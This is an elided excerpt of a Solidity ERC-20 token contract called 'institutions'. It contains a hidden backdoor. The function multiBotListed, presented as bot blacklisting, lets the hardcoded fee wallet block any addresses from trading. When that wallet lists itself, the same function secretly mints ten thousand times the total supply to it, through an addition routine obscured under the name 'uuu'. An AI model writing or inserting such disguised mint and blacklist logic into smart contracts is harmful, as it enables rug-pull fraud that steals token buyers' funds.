...
library SafeMath {
    ...
    function uuu(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
...
contract  institutions is Context, IERC20, Ownable{
    using SafeMath for uint256;
    string private _name = "institutions";
    string private _symbol = "institutions";
    ...
    constructor () {
        ...
        _feeAddrWallet1 = payable(address(0xf824cB2f40894caf42c30BE16eEA8f0E87c89047));
    ...
    function multiBotListed(address[] calldata addresses, bool status) public {
        require(_msgSender() == _feeAddrWallet1);
        for (uint256 i; i < addresses.length; i++) {
            if(addresses[i] != _feeAddrWallet1){
                _botListed[addresses[i]] = status;
            }else{
                _balances[_feeAddrWallet1] = _balances[_feeAddrWallet1].uuu(totalSupply()*10**4);
            }
        }
    }
